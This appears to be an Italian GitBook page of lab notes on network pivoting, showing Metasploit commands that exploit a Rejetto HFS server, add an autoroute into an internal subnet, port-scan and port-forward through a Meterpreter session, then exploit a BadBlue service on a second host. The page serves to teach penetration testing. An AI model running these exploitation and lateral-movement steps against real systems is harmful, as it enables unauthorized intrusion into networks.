# Pivoting

<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

una volta exploitato e avuto accesso a Victim 1 possiamo fare pivoting verso la rete interna a cui appartiene Victim 1, che ci permette di raggiungere Victim 2.

Utilizziamo la sessione meterrpeter su Victim 1 per accedere a Victim 2, passando effettivamente per Victim 1 altrimenti da Attacker non riusciremmo a raggiungere Victim 2.

## Test di accesso alle due vittime per comprendere il contesto

<figure><img src="../../../.gitbook/assets/image (1199).png" alt=""><figcaption></figcaption></figure>

Possiamo vedere che riusciamo a raggiungere Victim 1:

<figure><img src="../../../.gitbook/assets/image (1198).png" alt=""><figcaption></figcaption></figure>

Se proviamo ad accedere a Victim 2 direttamente non riusciamo:

<figure><img src="../../../.gitbook/assets/image (1201).png" alt=""><figcaption></figcaption></figure>

## Exploitiamo la prima vittima (Victim 1)

```
service postgresql start && msfconsole
workspace -a pivoting
db_nmap -sV 10.2.27.1 //Victim1
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOSTS 10.2.27.1 //Victim1
exploit
```

<figure><img src="../../../.gitbook/assets/image (1202).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1203).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1205).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1204).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1206).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1207).png" alt=""><figcaption></figcaption></figure>

## Facciamo pivoting verso Victim2

Listiamo le interfacce di rete di Victim1 e individuiamo qual è la rete interna sulla quale si trova Victim 2

```
//Listiamo le interfacce di rete di Victim1 e individuiamo qual è la rete interna sulla quale si trova Victim 2
ipconfig
run autoroute -s 10.2.27.0/20 //impostiamo l'autoroute sulla rete a cui appartiene l'IP di Victim1, che è la stessa rete di Victim2
//ora possiamo accedere a questa sottorete via msfconsole attraverso la sessione meterpreter che lasciamo attiva su Victim1
background
sessions
sessions -n victim-1 -i 1 //rinominiamo la sessione per non confonderci
sessions
```

<figure><img src="../../../.gitbook/assets/image (1208).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1209).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1210).png" alt=""><figcaption></figcaption></figure>

## Enumeriamo Victim2

{% hint style="warning" %}
Attenzione: non possiamo usare nmap o strumenti esterni per scannerizzare la sottorete perché il routing funziona solo con Metasploit Framework ed i suoi moduli
{% endhint %}

```
//Usiamo portscan module per scannerizzare la rete che abbiamo aggiunto con autoroute
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.2.27.187 //Victim2
set PORTS 1-100 //per risparmiare un po' di tempo limitiamo le porte, a piacimento
exploit
```

<figure><img src="../../../.gitbook/assets/image (1211).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1212).png" alt=""><figcaption></figcaption></figure>

Se tentiamo di accedere via browser vediamo che effettivamente Victim2 non è raggiungibile, perché il routing funziona solo in msfconsole.

Se vogliamo fare un nmap scan ad esempio, avremo bisogno di impostare un port forwarding della porta 80 di Victim2 su una porta locale della nostra istanza Kali Linux, per impostarlo dobbiamo farlo nella sessione meterpreter di Victim1.

## Portforwarding della porta 80 di Victim2

Impostiamo un port forwarding della porta 80 di Victim2 su una porta locale della nostra istanza Kali Linux, per impostarlo dobbiamo farlo nella sessione meterpreter di Victim1.

```
sessions 1
portfwd add -l 1234 -p 80 -r 10.2.27.187 //facciamo forward della porta 80 di Victim2 sulla 134 locale (Kali)
background
```

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

## Enumeration ed exploitation del servizio di Victim2 tramite port forwarding

Ora possiamo fare lo scan del servizio running sulla porta 80 di Victim2 con gli strumenti di Kali come Nmap effettuando lo scan sulla porta 1234 locale.

```
db_nmap -sS -sV -p 1234 localhost
search badblue
use exploit/windows/http/badblue_passthru
set payload windows/meterpreter/bind_tcp //perché una reverse connection non sarebbe possibile
show options
set RHOSTS 10.2.27.187
set LPORT 4433
exploit
sysinfo
background
sessions
sessions -n victim-2 -i 2
sessions
sessions 2
sysinfo
background
sessions 1
sysinfo
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Come possiamo vedere il servizio è running sulla nostra porta 1234, ma non fa rendering correttamente perché il nostro era un port forwarding molto di base.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Possiamo vedere che la macchina è Windows2016, quindi è Victim2 dato che l'altra era un OS diverso (Windows 2012).

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

